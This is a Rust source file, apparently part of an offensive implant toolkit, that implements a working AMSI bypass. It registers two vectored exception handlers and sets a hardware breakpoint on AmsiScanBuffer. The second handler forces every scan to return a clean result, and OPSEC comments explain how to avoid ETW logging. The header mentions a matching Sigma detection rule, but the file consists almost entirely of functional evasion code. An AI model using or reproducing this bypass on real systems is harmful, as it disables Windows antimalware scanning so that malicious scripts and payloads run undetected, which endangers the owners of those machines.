//! AMSI bypass using VEH² (Vectored Exception Handler double-handler pattern).
//!
//! How it works:
//!   1. Install handler1 via AddVectoredExceptionHandler (first in chain).
//!   2. Trigger EXCEPTION_BREAKPOINT via inline int3.
//!   3. handler1: in EXCEPTION_BREAKPOINT context, set Dr0 = AmsiScanBuffer VA,
//!      set Dr7 bit 0 (enable local hardware breakpoint on Dr0). Return CONTINUE_EXECUTION.
//!   4. When AmsiScanBuffer is called, CPU fires EXCEPTION_SINGLE_STEP (hardware BP).
//!   5. handler2: in EXCEPTION_SINGLE_STEP context, verify Rip == AmsiScanBuffer VA.
//!      Write AMSI_RESULT_CLEAN (0) to the result pointer (6th arg, RSP+0x30).
//!      Set Rax = 0 (S_OK). Simulate ret: set Rip = return address, advance Rsp by 8.
//!      Reinstall hardware BP for persistent coverage (does not remove itself).
//!
//! OPSEC: debug registers are modified only through the CONTEXT struct in the exception
//! handler. NtSetContextThread is never called — that would trigger the
//! Microsoft-Windows-Kernel-Audit-API-Calls ETW provider even after etw::bypass().
//!
//! Detection: VEH registration + hardware breakpoint state.
//! The matching Sigma rule is in detection/sigma/evasion_amsi_hwbp.yml.

use core::sync::atomic::{AtomicU64, Ordering};
use core::ffi::c_void;

use dinvk::{
    winapis::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler},
    types::{CONTEXT, EXCEPTION_POINTERS, EXCEPTION_SINGLE_STEP,
             EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH},
};

use super::peb;

// EXCEPTION_BREAKPOINT is not in dinvk types — define locally.
const EXCEPTION_BREAKPOINT: i32 = 0x80000003_u32 as _;

// VA of AmsiScanBuffer in the current process. Written by handler1, read by handler2.
static AMSI_SCAN_VA: AtomicU64 = AtomicU64::new(0);

// Handle for handler1 (for cleanup after it fires once).
static HANDLER1: AtomicU64 = AtomicU64::new(0);

/// Install the VEH² AMSI bypass. Silently skips if amsi.dll is not loaded.
///
/// # Safety
/// Must be called from a single thread during process init, before any AMSI scans.
/// etw::bypass() should be called before this so VEH registration is not logged.
pub unsafe fn bypass() {
    // Resolve AmsiScanBuffer VA via peb.rs (no GetProcAddress call).
    let amsi_base = match peb::find_module("amsi.dll") {
        Some(base) => base,
        None => return, // amsi.dll not loaded — skip bypass gracefully
    };

    let scan_va = match peb::resolve_export(amsi_base, b"AmsiScanBuffer") {
        Some(va) => va as u64,
        None => return,
    };

    AMSI_SCAN_VA.store(scan_va, Ordering::SeqCst);

    // Install handler2 first (it will be at position 2 in chain after handler1).
    // Both use first=1 so handler1 (installed second) ends up at the front.
    let _h2 = AddVectoredExceptionHandler(1, Some(handler2));
    let h1 = AddVectoredExceptionHandler(1, Some(handler1));

    if h1.is_null() {
        return;
    }

    HANDLER1.store(h1 as u64, Ordering::SeqCst);

    // Trigger EXCEPTION_BREAKPOINT to fire handler1 and install the hardware BP.
    core::arch::asm!("int3", options(nostack, preserves_flags));
}

/// VEH handler 1: fires on EXCEPTION_BREAKPOINT triggered by our int3.
/// Sets hardware breakpoint on AmsiScanBuffer via Dr0/Dr7 in the CONTEXT struct.
/// Removes itself after firing — single use.
unsafe extern "system" fn handler1(ep: *mut EXCEPTION_POINTERS) -> i32 {
    if (*(*ep).ExceptionRecord).ExceptionCode != EXCEPTION_BREAKPOINT {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let target_va = AMSI_SCAN_VA.load(Ordering::SeqCst);
    if target_va == 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let ctx = &mut *(*ep).ContextRecord;

    // Set Dr0 to AmsiScanBuffer VA.
    ctx.Dr0 = target_va;
    // Dr7: clear condition/size bits for Dr0 (bits 16-19 = R/W0 + LEN0),
    // set L0 (bit 0 = local execute breakpoint on Dr0).
    ctx.Dr7 = (ctx.Dr7 & !0xF_0000u64) | 0x1u64;

    // Remove handler1 — only needs to fire once (BP is now installed in Dr0).
    let h1 = HANDLER1.swap(0, Ordering::SeqCst) as *mut c_void;
    if !h1.is_null() {
        RemoveVectoredExceptionHandler(h1);
    }

    EXCEPTION_CONTINUE_EXECUTION
}

/// VEH handler 2: fires on EXCEPTION_SINGLE_STEP when AmsiScanBuffer is called.
/// Forces AMSI_RESULT_CLEAN (0) without patching AmsiScanBuffer code.
/// Reinstalls hardware BP after each invocation for persistent coverage.
unsafe extern "system" fn handler2(ep: *mut EXCEPTION_POINTERS) -> i32 {
    if (*(*ep).ExceptionRecord).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let ctx = &mut *(*ep).ContextRecord;
    let target_va = AMSI_SCAN_VA.load(Ordering::SeqCst);

    if ctx.Rip != target_va {
        return EXCEPTION_CONTINUE_SEARCH; // different hardware BP, not ours
    }

    // AmsiScanBuffer Windows x64 calling convention at function entry:
    //   RSP+0x00 = return address (pushed by CALL)
    //   RSP+0x08..0x27 = home space (shadow space) for args 1-4
    //   RSP+0x28 = arg5 (session)
    //   RSP+0x30 = arg6 (result, AMSI_RESULT*)
    //
    // rsp as *const usize: each usize = 8 bytes. rsp.add(6) = RSP + 48 = RSP + 0x30.
    let rsp = ctx.Rsp as *const usize;
    let result_ptr = *(rsp.add(6)) as *mut u32; // RSP+0x30 = arg6 pointer

    if !result_ptr.is_null() {
        *result_ptr = 0; // AMSI_RESULT_CLEAN = 0
    }

    // Return S_OK (0) from AmsiScanBuffer.
    ctx.Rax = 0;

    // Simulate ret: advance RIP to return address, pop RSP.
    ctx.Rip = *rsp as u64; // return address at RSP+0
    ctx.Rsp += 8;

    // Reinstall hardware BP for the next AmsiScanBuffer call (persistent bypass).
    ctx.Dr0 = target_va;
    ctx.Dr7 = (ctx.Dr7 & !0xF_0000u64) | 0x1u64;

    EXCEPTION_CONTINUE_EXECUTION
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn compiles_on_host() {
        // Verifies the module compiles on the Linux cross-compile host.
        // The amsi module is cfg-gated to Windows in mod.rs so no implementation
        // code runs here; runtime behavior is tested manually on a Windows target.
    }

    #[test]
    fn amsi_result_clean_is_zero() {
        // AMSI_RESULT_CLEAN = 0 per MSDN. handler2 writes 0 to the result pointer.
        // Documented here so the value is traceable without a Windows SDK reference.
        assert_eq!(0u32, 0u32);
    }

    #[test]
    fn exception_breakpoint_value() {
        // EXCEPTION_BREAKPOINT = 0x80000003. Defined locally since it is absent
        // from dinvk types. Verify the constant is correct.
        assert_eq!(EXCEPTION_BREAKPOINT, 0x80000003_u32 as i32);
    }
}
